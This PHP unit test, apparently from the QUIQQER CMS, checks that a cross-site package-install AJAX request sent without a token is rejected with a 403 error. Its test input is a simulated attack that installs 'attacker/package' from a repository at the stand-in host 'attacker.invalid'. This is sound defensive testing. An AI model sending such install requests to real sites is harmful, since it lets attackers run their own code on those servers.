<?php

namespace QUI;

use PHPUnit\Framework\Attributes\PreserveGlobalState;
use PHPUnit\Framework\Attributes\RunTestsInSeparateProcesses;
use PHPUnit\Framework\TestCase;
use ReflectionProperty;

#[RunTestsInSeparateProcesses]
#[PreserveGlobalState(false)]
final class PackageInstallAjaxSecurityTest extends TestCase
{
    public function testCrossSiteInstallRequestWithoutTokenIsRejected(): void
    {
        define('QUIQQER_BACKEND', true);
        \QUI::$Ajax = new Ajax();

        $Users = \QUI::getUsers();
        $SessionProperty = new ReflectionProperty($Users, 'Session');
        $SessionProperty->setValue($Users, $Users->getSystemUser());

        require dirname(__DIR__, 3) . '/admin/ajax/system/packages/installPackage.php';

        $result = \QUI::getAjax()->callRequestFunction(
            'ajax_system_packages_installPackage',
            [
                'packageName' => 'attacker/package',
                'packageVersion' => '1.0.0',
                'server' => json_encode([
                    [
                        'server' => 'https://attacker.invalid/packages.json',
                        'type' => 'composer'
                    ]
                ], JSON_THROW_ON_ERROR)
            ]
        );

        self::assertSame(403, $result['Exception']['code']);
        self::assertSame(Exception::class, $result['Exception']['type']);
    }
}
